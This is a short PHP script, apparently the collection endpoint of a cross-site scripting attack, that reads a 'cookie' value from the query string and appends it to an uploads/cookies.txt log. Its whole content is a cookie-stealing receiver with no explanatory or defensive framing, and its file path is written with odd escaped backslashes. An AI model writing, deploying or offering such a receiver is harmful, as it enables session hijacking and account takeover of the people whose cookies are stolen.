<?php

$cookie=$_GET['cookie'];
$file = fopen("\uploads\cookies.txt","a");
fwrite($file, $cookie."\\n");
fclose($file);

?>